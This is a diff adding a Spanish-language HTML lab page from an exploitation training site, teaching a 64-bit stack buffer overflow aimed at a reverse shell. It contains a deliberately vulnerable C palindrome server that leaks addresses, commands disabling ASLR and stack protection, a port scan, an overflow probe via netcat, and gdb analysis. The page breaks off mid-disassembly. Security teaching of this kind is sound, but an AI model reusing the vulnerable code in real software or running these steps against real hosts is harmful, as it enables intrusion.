@@ -1,0 +1,1450 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <meta name="description" content="Laboratorio práctico de explotación de vulnerabilidades - Buffer Overflow en arquitectura x64">
+    <meta name="author" content="ExploitLabs">
+    <title>Buffer Overflow x64 | Reverse Shell Lab</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Source+Code+Pro:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/vs2015.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+   <style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        background: #0a0c0f;
+        color: #e0e0e0;
+        font-family: 'Inter', sans-serif;
+        line-height: 1.6;
+        scroll-behavior: smooth;
+    }
+
+    ::-webkit-scrollbar {
+        width: 10px;
+        height: 10px;
+    }
+    ::-webkit-scrollbar-track {
+        background: #1a1d24;
+    }
+    ::-webkit-scrollbar-thumb {
+        background: #2ecc71;
+        border-radius: 5px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+        background: #27ae60;
+    }
+
+    /* Estilos para menú desplegable */
+    .nav-links {
+        display: flex;
+        gap: 1.5rem;
+        list-style: none;
+        align-items: center;
+    }
+
+    .nav-item {
+        position: relative;
+    }
+
+    .nav-link {
+        color: #e0e0e0;
+        text-decoration: none;
+        transition: color 0.3s;
+        font-weight: 500;
+        display: inline-block;
+        padding: 0.5rem 0;
+        cursor: pointer;
+        white-space: nowrap;
+    }
+
+    .nav-link:hover {
+        color: #2ecc71;
+    }
+
+    /* Submenú desplegable */
+    .submenu {
+        position: absolute;
+        top: 100%;
+        left: 0;
+        background: #111317;
+        border: 1px solid #2ecc71;
+        border-radius: 12px;
+        min-width: 220px;
+        opacity: 0;
+        visibility: hidden;
+        transform: translateY(-10px);
+        transition: all 0.3s ease;
+        z-index: 1000;
+        box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        backdrop-filter: blur(5px);
+    }
+
+    .nav-item:hover .submenu {
+        opacity: 1;
+        visibility: visible;
+        transform: translateY(0);
+    }
+
+    .submenu a {
+        display: block;
+        padding: 0.7rem 1.2rem;
+        color: #e0e0e0;
+        text-decoration: none;
+        font-size: 0.9rem;
+        transition: all 0.2s;
+        border-bottom: 1px solid #1f2329;
+    }
+
+    .submenu a:last-child {
+        border-bottom: none;
+    }
+
+    .submenu a:hover {
+        background: #1a1d24;
+        color: #2ecc71;
+        padding-left: 1.5rem;
+    }
+
+    /* Enlace externo estilo botón */
+    .nav-link-external {
+        background: #1a1d24;
+        padding: 0.4rem 0.8rem;
+        border-radius: 20px;
+        border: 1px solid #2ecc71;
+    }
+
+    .nav-link-external:hover {
+        background: #2ecc71;
+        color: #0a0c0f !important;
+    }
+
+    .book-gif {
+        text-align: center;
+        margin: 1rem 0;
+    }
+
+    .book-gif img {
+        width: 100%;
+        max-width: 180px;
+        height: auto;
+        border-radius: 12px;
+        border: 1px solid rgba(46, 204, 71, 0.3);
+        transition: transform 0.3s ease;
+    }
+
+    .book-gif img:hover {
+        transform: scale(1.05);
+    }
+
+    /* Layout de dos columnas */
+    .container-main {
+        max-width: 1600px;
+        margin: 0 auto;
+        padding: 2rem;
+    }
+
+    .content-wrapper {
+        display: flex;
+        gap: 2rem;
+        position: relative;
+    }
+
+    .main-content {
+        flex: 1;
+        min-width: 0;
+    }
+
+    .main-content p, 
+    .main-content .section-card p,
+    .main-content .alert p {
+        text-align: justify;
+    }
+
+    /* Sidebar sticky */
+    .sidebar {
+        width: 320px;
+        flex-shrink: 0;
+        position: sticky;
+        top: 100px;
+        align-self: flex-start;
+        max-height: calc(100vh - 120px);
+        overflow-y: auto;
+    }
+
+    .book-card {
+        background: linear-gradient(135deg, #111317 0%, #0d0f14 100%);
+        border: 1px solid #2ecc71;
+        border-radius: 20px;
+        padding: 1.5rem;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    .book-card:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 15px 40px rgba(46, 204, 113, 0.15);
+    }
+
+    .book-icon {
+        text-align: center;
+        margin-bottom: 1rem;
+    }
+
+    .book-icon i {
+        font-size: 3rem;
+        color: #2ecc71;
+    }
+
+    .book-card h3 {
+        color: #2ecc71;
+        font-size: 1.2rem;
+        margin-bottom: 1rem;
+        text-align: center;
+        border-left: none;
+        padding-left: 0;
+    }
+
+    .book-card h4 {
+        color: #2ecc71;
+        font-size: 1rem;
+        margin: 1rem 0 0.5rem 0;
+    }
+
+    .book-card p {
+        font-size: 0.85rem;
+        line-height: 1.5;
+        color: #c0c0c0;
+        margin-bottom: 0.75rem;
+    }
+
+    .book-card ul {
+        margin: 0.5rem 0 0.5rem 1rem;
+        list-style: none;
+    }
+
+    .book-card ul li {
+        font-size: 0.8rem;
+        color: #b0b0b0;
+        margin-bottom: 0.25rem;
+        padding-left: 0rem;
+    }
+
+    .book-divider {
+        height: 1px;
+        background: linear-gradient(90deg, transparent, #2ecc71, transparent);
+        margin: 1rem 0;
+    }
+
+    .book-conclusion {
+        font-style: italic;
+        font-size: 0.8rem;
+        background: rgba(46, 204, 113, 0.1);
+        padding: 0.75rem;
+        border-radius: 12px;
+    }
+
+    .book-action {
+        text-align: center;
+        margin-top: 1rem;
+        padding: 0.75rem;
+        background: #1a1d24;
+        border-radius: 30px;
+        color: #2ecc71;
+        font-weight: 600;
+        font-size: 0.9rem;
+        border: 1px solid #2ecc71;
+        transition: all 0.3s;
+    }
+
+    .book-action:hover {
+        background: #2ecc71;
+        color: #0a0c0f;
+        cursor: pointer;
+    }
+
+    @media (max-width: 1200px) {
+        .nav-links {
+            gap: 1rem;
+        }
+        .nav-link {
+            font-size: 0.9rem;
+        }
+    }
+
+    @media (max-width: 1024px) {
+        .content-wrapper {
+            flex-direction: column;
+        }
+        .sidebar {
+            width: 100%;
+            position: static;
+            margin-top: 2rem;
+        }
+        .nav-links {
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 0.8rem;
+        }
+        .submenu {
+            position: static;
+            opacity: 1;
+            visibility: visible;
+            transform: none;
+            display: none;
+            margin-top: 0.5rem;
+            background: #0a0c0f;
+        }
+        .nav-item.active .submenu {
+            display: block;
+        }
+        .navbar {
+            padding: 0.8rem 1rem;
+        }
+    }
+
+    .navbar {
+        position: fixed;
+        top: 0;
+        width: 100%;
+        background: rgba(10, 12, 15, 0.95);
+        backdrop-filter: blur(10px);
+        border-bottom: 1px solid #2ecc71;
+        padding: 0.5rem 2rem;
+        z-index: 1000;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        flex-wrap: wrap;
+    }
+
+    /* Nuevo estilo para el logo con imagen de 160px optimizado */
+    .logo {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        flex-shrink: 0;
+    }
+    
+    .logo img {
+        height: 120px;
+        width: auto;
+        display: block;
+        filter: drop-shadow(0 0 8px rgba(46, 204, 113, 0.3));
+        transition: transform 0.3s ease;
+    }
+    
+    .logo img:hover {
+        transform: scale(1.05);
+    }
+    
+    .logo-text {
+        font-size: 2.3rem;
+        font-weight: 700;
+        background: linear-gradient(135deg, #2ecc71, #27ae60);
+        -webkit-background-clip: text;
+        background-clip: text;
+        color: transparent;
+        letter-spacing: 1px;
+        white-space: nowrap;
+    }
+
+    .hero {
+        margin-top: 80px;
+        padding: 3rem 2rem;
+        background: linear-gradient(135deg, #0f1419 0%, #0a0c0f 100%);
+        border-bottom: 2px solid #2ecc71;
+        text-align: center;
+    }
+
+    .hero h1 {
+        font-size: 2.8rem;
+        margin-bottom: 1rem;
+        font-weight: 800;
+    }
+
+    .hero h1 span {
+        color: #2ecc71;
+        font-family: 'Source Code Pro', monospace;
+    }
+
+    .hero p {
+        font-size: 1.1rem;
+        max-width: 800px;
+        margin: 0 auto;
+        color: #b0b0b0;
+    }
+
+    .badge-container {
+        margin-top: 1.5rem;
+        display: flex;
+        gap: 0.8rem;
+        justify-content: center;
+        flex-wrap: wrap;
+    }
+
+    .badge {
+        padding: 0.4rem 0.9rem;
+        border-radius: 20px;
+        font-size: 0.8rem;
+        font-weight: 600;
+        background: #1a1d24;
+        color: #2ecc71;
+        border: 1px solid #2ecc71;
+    }
+
+    .container {
+        max-width: 1400px;
+        margin: 0 auto;
+        padding: 2rem;
+    }
+
+    .section-card {
+        background: #111317;
+        border-radius: 16px;
+        padding: 2rem;
+        margin-bottom: 2rem;
+        border: 1px solid #1f2329;
+        transition: transform 0.2s, border-color 0.3s;
+    }
+
+    .section-card:hover {
+        border-color: #2ecc71;
+        transform: translateY(-2px);
+    }
+
+    .section-title {
+        font-size: 1.8rem;
+        margin-bottom: 1.5rem;
+        display: flex;
+        align-items: center;
+        gap: 0.75rem;
+        border-left: 4px solid #2ecc71;
+        padding-left: 1rem;
+    }
+
+    .section-title i {
+        color: #2ecc71;
+        font-size: 1.5rem;
+    }
+
+    .numbered-code {
+        counter-reset: line;
+        background: #0a0c0f;
+        border-radius: 12px;
+        margin: 1.5rem 0;
+        border: 1px solid #1f2329;
+        overflow-x: auto;
+    }
+    .numbered-code pre {
+        margin: 0;
+        padding: 1rem;
+        background: transparent;
+        border: none;
+    }
+    .numbered-code code {
+        display: block;
+        font-family: 'Source Code Pro', monospace;
+        font-size: 0.85rem;
+        line-height: 1.6;
+    }
+    .numbered-code code .line {
+        counter-increment: line;
+        display: block;
+    }
+    .numbered-code code .line::before {
+        content: counter(line);
+        display: inline-block;
+        width: 2.5rem;
+        color: #6c7a89;
+        text-align: right;
+        margin-right: 1rem;
+        user-select: none;
+    }
+
+    pre {
+        background: #0a0c0f;
+        border-radius: 12px;
+        padding: 1.5rem;
+        margin: 1.5rem 0;
+        overflow-x: auto;
+        border: 1px solid #1f2329;
+        font-family: 'Source Code Pro', monospace;
+        font-size: 0.85rem;
+        position: relative;
+    }
+
+    code {
+        font-family: 'Source Code Pro', monospace;
+    }
+
+    .copy-btn {
+        position: absolute;
+        top: 10px;
+        right: 10px;
+        background: #2ecc71;
+        border: none;
+        color: #0a0c0f;
+        padding: 5px 10px;
+        border-radius: 6px;
+        cursor: pointer;
+        font-size: 0.75rem;
+        font-weight: bold;
+        transition: background 0.3s;
+        z-index: 10;
+    }
+
+    .copy-btn:hover {
+        background: #27ae60;
+    }
+
+    .data-table {
+        width: 100%;
+        border-collapse: collapse;
+        margin: 1.5rem 0;
+    }
+
+    .data-table th, .data-table td {
+        padding: 0.75rem;
+        text-align: left;
+        border-bottom: 1px solid #1f2329;
+    }
+
+    .data-table th {
+        color: #2ecc71;
+        font-weight: 600;
+    }
+
+    .alert {
+        padding: 1rem;
+        border-radius: 8px;
+        margin: 1rem 0;
+        border-left: 4px solid;
+    }
+
+    .alert-warning {
+        background: rgba(241, 196, 15, 0.1);
+        border-left-color: #f1c40f;
+        color: #f1c40f;
+    }
+
+    .alert-success {
+        background: rgba(46, 204, 113, 0.1);
+        border-left-color: #2ecc71;
+        color: #2ecc71;
+    }
+
+    .alert-danger {
+        background: rgba(231, 76, 60, 0.1);
+        border-left-color: #e74c3c;
+        color: #e74c3c;
+    }
+
+    .alert-info {
+        background: rgba(52, 152, 219, 0.1);
+        border-left-color: #3498db;
+        color: #3498db;
+    }
+
+    .terminal {
+        background: #000000;
+        color: #2ecc71;
+        padding: 1.5rem;
+        border-radius: 12px;
+        font-family: 'Source Code Pro', monospace;
+        font-size: 0.85rem;
+        margin: 1.5rem 0;
+        border: 1px solid #2ecc71;
+    }
+
+    .terminal-prompt {
+        color: #2ecc71;
+    }
+
+    .terminal-output {
+        color: #e0e0e0;
+        margin-left: 1rem;
+    }
+
+    .resource-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+        gap: 1.5rem;
+        margin: 1.5rem 0;
+    }
+
+    .resource-card {
+        background: #0a0c0f;
+        padding: 1.5rem;
+        border-radius: 12px;
+        text-align: center;
+        border: 1px solid #1f2329;
+    }
+
+    .resource-card i {
+        font-size: 2rem;
+        color: #2ecc71;
+        margin-bottom: 1rem;
+    }
+
+    .footer {
+        background: #0a0c0f;
+        border-top: 1px solid #1f2329;
+        padding: 2rem;
+        text-align: center;
+        margin-top: 3rem;
+    }
+
+    @media (max-width: 768px) {
+        .navbar {
+            flex-direction: column;
+            gap: 0.8rem;
+            padding: 0.8rem;
+        }
+        .hero h1 {
+            font-size: 1.8rem;
+        }
+        .section-title {
+            font-size: 1.3rem;
+        }
+        .container {
+            padding: 1rem;
+        }
+        pre {
+            font-size: 0.7rem;
+        }
+        .logo img {
+            height: 45px;
+        }
+        .logo-text {
+            font-size: 1rem;
+        }
+        .hero {
+            margin-top: 100px;
+            padding: 2rem 1rem;
+        }
+    }
+
+    @keyframes blink {
+        0%, 100% { opacity: 1; }
+        50% { opacity: 0; }
+    }
+    
+    .cursor {
+        display: inline-block;
+        width: 10px;
+        height: 18px;
+        background: #2ecc71;
+        animation: blink 1s infinite;
+        vertical-align: middle;
+    }
+</style>
+</head>
+<body>
+
+<nav class="navbar">
+    <div class="logo">
+        <img src="Logo.png" alt="Logo">
+        <span class="logo-text">I'm root</span>
+    </div>
+    <ul class="nav-links">
+        <li class="nav-item">
+            <span class="nav-link"><i class="fas fa-home"></i> Inicio <i class="fas fa-chevron-down" style="font-size: 0.7rem; margin-left: 5px;"></i></span>
+            <div class="submenu">
+                <a href="index.html"><i class="fas fa-house-user"></i> I'm root</a>
+                <a href="index.html#maquina-virtual"><i class="fas fa-desktop"></i> Máquina virtual CTF</a>
+                <a href="index.html#laboratorios"><i class="fas fa-flask"></i> Laboratorios</a>
+                <a href="index.html#libro"><i class="fas fa-book"></i> Libro</a>
+                <a href="index.html#curso"><i class="fas fa-chalkboard-user"></i> Curso</a>
+                <a href="index.html#autor"><i class="fas fa-user-tie"></i> Sobre el autor</a>
+            </div>
+        </li>
+        
+        <li class="nav-item">
+            <span class="nav-link"><i class="fas fa-flask"></i> Lab 1 <i class="fas fa-chevron-down" style="font-size: 0.7rem; margin-left: 5px;"></i></span>
+            <div class="submenu">
+                <a href="Lab_1.html"><i class="fas fa-bullseye"></i> Objetivo</a>
+                <a href="#preparacion"><i class="fas fa-tools"></i> Preparación</a>
+                <a href="#codigo"><i class="fas fa-code"></i> Código fuente</a>
+                <a href="#explotacion"><i class="fas fa-bug"></i> Explotación</a>
+                <a href="#recursos"><i class="fas fa-chart-line"></i> Recursos</a>
+            </div>
+        </li>
+
+        <li class="nav-item">
+            <span class="nav-link"><i class="fas fa-flask"></i> Lab 2 <i class="fas fa-chevron-down" style="font-size: 0.7rem; margin-left: 5px;"></i></span>
+            <div class="submenu">
+                <a href="Lab_2.html"><i class="fas fa-bullseye"></i> Objetivo</a>
+                <a href="Lab_2.html#preparacion"><i class="fas fa-tools"></i> Preparación</a>
+                <a href="Lab_2.html#codigo"><i class="fas fa-code"></i> Código fuente</a>
+                <a href="Lab_2.html#explotacion"><i class="fas fa-bug"></i> Explotación</a>
+                <a href="Lab_2.html#herramientas"><i class="fas fa-chart-line"></i> Recursos</a>
+            </div>
+        </li>
+
+        <li class="nav-item">
+            <a href="get_digital_only.html" class="nav-link nav-link-external"><i class="fas fa-shopping-cart"></i> Adquirir el libro</a>
+        </li>
+    </ul>
+</nav>
+<section id="objetivo" class="hero">
+    <h1>Reverse <span>Shell</span></h1>
+    <div class="badge-container">
+        <span class="badge"><i class="fas fa-microchip"></i> x64</span>
+        <span class="badge"><i class="fas fa-shield-alt"></i> ASLR disabled</span>
+        <span class="badge"><i class="fas fa-terminal"></i> GDB / msfvenom</span>
+        <span class="badge"><i class="fas fa-bug"></i> Stack overflow</span>
+        <span class="badge"><i class="fas fa-network-wired"></i> Reverse TCP</span>
+    </div>
+</section> 
+
+
+
+    <div class="container-main">
+        <div class="content-wrapper">
+            <div class="main-content">
+                <!-- OBJETIVO -->
+                <div id="objetivo-detalle" class="section-card">
+                    <h2 class="section-title"><i class="fas fa-bullseye"></i> OBJETIVO</h2>
+                    <p>Mediante la explotación de una vulnerabilidad originada por un desbordamiento de búfer en una arquitectura de 64 bits, obtener una reverse shell que permita tomar el control remoto del sistema objetivo.</p>
+                </div>
+
+                <!-- PREPARACIÓN -->
+                <div id="preparacion" class="section-card">
+                    <h2 class="section-title"><i class="fas fa-tools"></i> PREPARACIÓN DE LABORATORIO</h2>
+                    <p>Antes de iniciar directamente con la explotación de la vulnerabilidad, es necesario preparar el entorno de trabajo asegurando que los sistemas se encuentren correctamente configurados dentro de un entorno virtualizado. Para ello, podemos utilizar <a href="https://www.virtualbox.org/wiki/Downloads" target="_blank" style="color: #2ecc71;">VirtualBox</a> versión 7.2.8, ejecutando la distribución <a href="https://www.debian.org/distrib/" target="_blank" style="color: #2ecc71;">GNU/Linux Debian 13.5</a> como sistema objetivo. El entorno emplea el kernel versión 6.12.88+deb13-amd64, y la compilación del código fuente de la práctica se realiza utilizando el compilador GCC en su versión 14.2.0.</p><br>
+                    <p>Asimismo, a continuación se indican las herramientas necesarias para la creación y preparación de la máquina virtual:</p>
+                    <pre><code class="language-bash">#apt-get update && apt-get install -y vim build-essential gdb net-tools isc-dhcp-client python3-pip python3-ropgadget</code></pre>
+                    <p>Como parte de la práctica de laboratorio, y con el objetivo de facilitar el análisis de memoria (simulando el comportamiento de una máquina tipo CTF), se deshabilita el mecanismo de seguridad ASLR (Address Space Layout Randomization).</p>
+                    <div class="terminal">
+                        <div><span class="terminal-prompt">#</span> /usr/sbin/sysctl -w kernel.randomize_va_space=0</div>
+                        <div class="terminal-output">kernel.randomize_va_space = 0</div>
+                    </div>
+                    <p>Para el sistema atacante, es posible emplear alguna distribución de <a href="https://www.kali.org/get-kali/#kali-platforms" target="_blank" style="color: #2ecc71;">Kali Linux</a>, que en este caso se utilizó el kernel 6.18.12+kali-amd64.</p>
+                </div>
+
+                <!-- CÓDIGO FUENTE -->
+                <div id="codigo" class="section-card">
+                    <h2 class="section-title"><i class="fas fa-code"></i> CÓDIGO FUENTE</h2>
+                    <p>Se presenta el siguiente código en C vulnerable, el cual será utilizado como objetivo de explotación. Su funcionalidad se limita a recibir una cadena de texto y determinar si esta corresponde a un palíndromo. Es importante notar que la función <code>obtener_tamanio()</code>, ubicada en la línea 16, introduce un valor dinámico que provoca variaciones en el offset del stack, lo que obliga a ajustar el exploit en cada ejecución.</p>
+                    <div class="numbered-code">
+                        <pre><code class="language-c" id="codigo-fuente">
+<span class="line">#include&lt;stdio.h&gt;</span>
+<span class="line">#include&lt;stdlib.h&gt;</span>
+<span class="line">#include&lt;string.h&gt;</span>
+<span class="line">#include&lt;arpa/inet.h&gt;</span>
+<span class="line">#include&lt;signal.h&gt;</span>
+<span class="line">#include&lt;unistd.h&gt;</span>
+<span class="line">#include&lt;time.h&gt;</span>
+<span class="line"></span>
+<span class="line">#define TamCli 1800</span>
+<span class="line">#define TamSer 1800</span>
+<span class="line">#define PUERTO 9999</span>
+<span class="line"></span>
+<span class="line">unsigned char *buffer_global = (unsigned char *)0xffffffffffffffff;</span>
+<span class="line">unsigned char *reg_rbp = (unsigned char *)0xffffffffffffffff;</span>
+<span class="line"></span>
+<span class="line">int obtener_tamanio() {</span>
+<span class="line">        srand(time(NULL));</span>
+<span class="line">        return 405 + rand() % (599 - 405 + 1);</span>
+<span class="line">}</span>
+<span class="line"></span>
+<span class="line">void copiar_Cadena_En_Buffer(char *Mensaje_Cliente, int bytes, int n){</span>
+<span class="line">        char buffer[n];</span>
+<span class="line">        printf ( "\nDirección de inicio del buffer es \t\t\t%p", &buffer ) ;</span>
+<span class="line">        buffer_global = buffer;</span>
+<span class="line">        __asm__("movq %%rbp, %0" : "=r" (reg_rbp));</span>
+<span class="line">        printf("\nValor de RBP:\t\t\t\t\t\t%p \n", reg_rbp);</span>
+<span class="line">        memcpy(buffer, Mensaje_Cliente, bytes);</span>
+<span class="line">}</span>
+<span class="line"></span>
+<span class="line">int Es_Palindromo(char buffer[], int s, int e){</span>
+<span class="line">        if(s == e){return 1;}</span>
+<span class="line">        if(buffer[s] != buffer[e]){return 0;}</span>
+<span class="line">        if(s &lt; e + 1){return Es_Palindromo(buffer, s + 1, e - 1);}</span>
+<span class="line">        return 1;</span>
+<span class="line">}</span>
+<span class="line"></span>
+<span class="line">int Valida_Cadena(char *Mensaje_Cliente){</span>
+<span class="line">        char buffer[1300];</span>
+<span class="line">        int ban = 0, n;</span>
+<span class="line">        strcpy(buffer, Mensaje_Cliente);</span>
+<span class="line">        n = strlen(buffer);</span>
+<span class="line">        if(n==0){return 1;}</span>
+<span class="line">        ban = Es_Palindromo(buffer, 0, n-1);</span>
+<span class="line">        if(ban==0)</span>
+<span class="line">                return 0;</span>
+<span class="line">        else</span>
+<span class="line">                return 1;</span>
+<span class="line">}</span>
+<span class="line"></span>
+<span class="line">int main(int argc, char *argv[]){</span>
+<span class="line">        int descriptor_socket, cliente_socket, c, i, ban=1, n=obtener_tamanio();</span>
+<span class="line">        struct sockaddr_in servidor, cliente;</span>
+<span class="line">        char Mensaje_Cliente[TamCli], Mensaje_Servidor_1[TamSer], Mensaje_Servidor_2[TamSer];</span>
+<span class="line">        for(i=0; i&lt;TamSer; i++)</span>
+<span class="line">                Mensaje_Servidor_2[i] = '\0';</span>
+<span class="line">        for(i=0; i&lt;TamSer; i++)</span>
+<span class="line">                Mensaje_Servidor_1[i] = '\0';</span>
+<span class="line">        descriptor_socket = socket(AF_INET, SOCK_STREAM, 0);</span>
+<span class="line">        if(descriptor_socket == -1)</span>
+<span class="line">                printf("El socket no puede ser creado\n");</span>
+<span class="line">        servidor.sin_family =  AF_INET;</span>
+<span class="line">        servidor.sin_addr.s_addr = INADDR_ANY;</span>
+<span class="line">        servidor.sin_port =htons(PUERTO);</span>
+<span class="line">        if(bind(descriptor_socket,(struct sockaddr *)&amp;servidor, sizeof(servidor))&lt;0){</span>
+<span class="line">                perror("Error en Bind");</span>
+<span class="line">                return 1;</span>
+<span class="line">        }</span>
+<span class="line">        listen(descriptor_socket, 10);</span>
+<span class="line">        printf("Escuchando peticiones por el puerto: %i\n", PUERTO);</span>
+<span class="line">        puts("Esperando conexiones...");</span>
+<span class="line">        c = sizeof(struct sockaddr_in);</span>
+<span class="line">        signal(descriptor_socket, SIG_IGN);</span>
+<span class="line">        while(1){</span>
+<span class="line">                strcpy(Mensaje_Servidor_1, "Ingresa una palabra para revisar si es un palíndromo: ");</span>
+<span class="line">                for(i=0; i&lt;TamCli; i++)</span>
+<span class="line">                        Mensaje_Cliente[i] = '\0';</span>
+<span class="line">                cliente_socket = accept(descriptor_socket, (struct sockaddr *)&amp;cliente, (socklen_t*)&amp;c);</span>
+<span class="line">                if(cliente_socket &lt;0){</span>
+<span class="line">                        perror("Las conexiones no pueden ser aceptadas\n");</span>
+<span class="line">                        return 1;</span>
+<span class="line">                }</span>
+<span class="line">                puts("Conexión aceptada...");</span>
+<span class="line">                if(fork()==0){</span>
+<span class="line">                        write(cliente_socket, Mensaje_Servidor_1, strlen(Mensaje_Servidor_1));</span>
+<span class="line">                        recv(cliente_socket, Mensaje_Cliente, 1300, 0);</span>
+<span class="line">                        int tamanio=0;</span>
+<span class="line">                        printf("Cliente: ");</span>
+<span class="line">                        while(Mensaje_Cliente[tamanio]!=0x0A){</span>
+<span class="line">                                printf("%c",Mensaje_Cliente[tamanio]);</span>
+<span class="line">                                tamanio++;</span>
+<span class="line">                        }</span>
+<span class="line">                        printf("\n");</span>
+<span class="line">                        copiar_Cadena_En_Buffer(Mensaje_Cliente, tamanio, n);</span>
+<span class="line">                        Mensaje_Cliente[tamanio] = '\0';</span>
+<span class="line">                        ban = Valida_Cadena(Mensaje_Cliente);</span>
+<span class="line">                        if (ban == 1) {</span>
+<span class="line">                            snprintf(Mensaje_Servidor_2, TamSer,</span>
+<span class="line">                                     "\nSí, la palabra es palíndromo\n"</span>
+<span class="line">                                     "Dirección inicio de buffer:\t%p\n"</span>
+<span class="line">                                     "Dirección registro de rbp:\t%p\n\n",</span>
+<span class="line">                                     (void *)buffer_global, (void *)reg_rbp);</span>
+<span class="line">                            write(cliente_socket, Mensaje_Servidor_2, strlen(Mensaje_Servidor_2));</span>
+<span class="line">                        } else {</span>
+<span class="line">                            snprintf(Mensaje_Servidor_1, TamSer,</span>
+<span class="line">                                     "\nNo, la palabra no es un palíndromo\n"</span>
+<span class="line">                                     "Dirección inicio de buffer:\t%p\n"</span>
+<span class="line">                                     "Dirección registro de rbp:\t%p\n\n",</span>
+<span class="line">                                     (void *)buffer_global, (void *)reg_rbp);</span>
+<span class="line">                            write(cliente_socket, Mensaje_Servidor_1, strlen(Mensaje_Servidor_1));</span>
+<span class="line">                        }</span>
+<span class="line">                        ban = 1;</span>
+<span class="line">                        close(cliente_socket);</span>
+<span class="line">                        puts("El cliente fue desconectado\n");</span>
+<span class="line">                        fflush(stdout);</span>
+<span class="line">                }</span>
+<span class="line">                else{</span>
+<span class="line">                        close(cliente_socket);</span>
+<span class="line">                }</span>
+<span class="line">        }</span>
+<span class="line">        return 0;</span>
+<span class="line">}</span>
+</code></pre>
+                    </div>
+
+
+		    <p>En este laboratorio, se permite la ejecución de código en el segmento de pila (con NX desactivado) mediante el uso del parámetro -z execstack durante la compilación del programa con gcc. Una vez compilado, se ejecuta el programa, el cual queda a la espera de cadenas que serán enviadas de forma remota para su validación.</p>
+                    <div class="terminal">
+                        <div><span class="terminal-prompt">$</span>gcc Servicio_1.c -z execstack -o Servicio_1.exe</div>
+                        <div><span class="terminal-prompt">$./Servicio_1.exe</div>
+                    </div>
+
+                </div>
+
+                <!-- EXPLOTACIÓN -->
+                <div id="explotacion" class="section-card">
+                    <h2 class="section-title"><i class="fas fa-bug"></i> EXPLOTACIÓN</h2>
+                    <p>Para iniciar el proceso de explotación de la vulnerabilidad, desde la máquina atacante se realiza un escaneo de puertos contra la máquina objetivo, la cual cuenta con la dirección IP 192.168.1.11.</p>
+                    <div class="terminal">
+                        <div><span class="terminal-prompt">┌──(debian㉿debian)-[~]</span></div>
+                        <div>└─$ nmap -p- 192.168.1.11</div>
+                        <div class="terminal-output">Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-01 21:38 -0500</div>
+                        <div class="terminal-output">Nmap scan report for 192.168.1.11</div>
+                        <div class="terminal-output">PORT     STATE SERVICE</div>
+                        <div class="terminal-output">22/tcp   open  ssh</div>
+                        <div class="terminal-output">9999/tcp open  abyss</div>
+                    </div>
+		    
+		    
+	    <p>Podemos observar que únicamente se encuentran abiertos dos puertos: 22 y 9999. A través del puerto 9999 es posible enviar directamente una cadena de texto a la máquina objetivo para validar si el contenido corresponde a un palíndromo o no. Al analizar la respuesta recibida por el programa, se obtiene información adicional relevante, como la dirección de inicio del búfer (espacio de memoria donde se almacena la cadena a evaluar) y la dirección del registro RBP. Estos datos resultan fundamentales para llevar a cabo la explotación de la vulnerabilidad de forma remota, especialmente en escenarios de práctica tipo CTF.</p>
+            
+            <div class="terminal">
+                <div><span class="terminal-prompt">┌──(debian㉿debian)-[~/Exploit_LAB1]</span></div>
+                <div>└─$ python3 -c "print('A'*94 + 'B'*4)" | nc 192.168.1.11 9999</div>
+                <div class="terminal-output">Ingresa una palabra para revisar si es un palíndromo:</div>
+                <div class="terminal-output">No, la palabra no es un palíndromo</div>
+                <div class="terminal-output">Dirección inicio de buffer:     0x7fffffffcba0</div>
+                <div class="terminal-output">Dirección registro de rbp:      0x7fffffffcd80</div>
+            </div>
+
+	    <p>Con fines de estudio y práctica de laboratorio, regresamos a la máquina objetivo y detenemos la ejecución del programa mediante la combinación de teclas Ctrl + C. Posteriormente, iniciamos el proceso de depuración del programa utilizando gdb. Establecemos un breakpoint al inicio de la función main y se ejecuta el programa bajo el depurador. Como resultado, se observa que la ejecución del programa se detiene correctamente en el breakpoint.</p>
+            
+            <pre><code class="language-bash">debian@debian:~/LAB1$ gdb -q Servicio_1.exe
+(gdb) breakpoint main
+Breakpoint 1 at 0x150f
+(gdb) run
+Starting program: /home/debian/LAB1/Servicio_1.exe
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Breakpoint 1, 0x000055555555550f in main ()
+
+	    </code></pre>
+
+	    <p>Dado que contamos con acceso al código fuente, sabemos que es necesario centrar el análisis en la función copiar_Cadena_En_Buffer().
+Para este caso en particular, podemos listar todas las funciones cuyos nombres comiencen con la subcadena ^cop, lo que nos proporciona el siguiente resultado:</p>
+            
+            <pre><code class="language-bash">
+(gdb) info functions ^cop
+All functions matching regular expression "^cop":
+
+Non-debugging symbols:
+0x0000555555555351  copiar_Cadena_En_Buffer
+0x00007ffff7e05fe0  copysignl
+0x00007ffff7e06350  copysign
+0x00007ffff7e06720  copysignf
+0x00007ffff7ec6810  copy_file_range
+	    </code></pre>
+
+
+	    <p> Ahora realizamos el desensamblado de la función copiar_Cadena_En_Buffer():</p>
+            
+            <pre><code class="language-bash">
+(gdb) disassemble copiar_Cadena_En_Buffer
+Dump of assembler code for function copiar_Cadena_En_Buffer:
+   0x0000555555555351 <+0>:     push   %rbp
+   0x0000555555555352 <+1>:     mov    %rsp,%rbp
+   0x0000555555555355 <+4>:     push   %rbx
+   0x0000555555555356 <+5>:     sub    $0x28,%rsp
+   0x000055555555535a <+9>:     mov    %rdi,-0x28(%rbp)
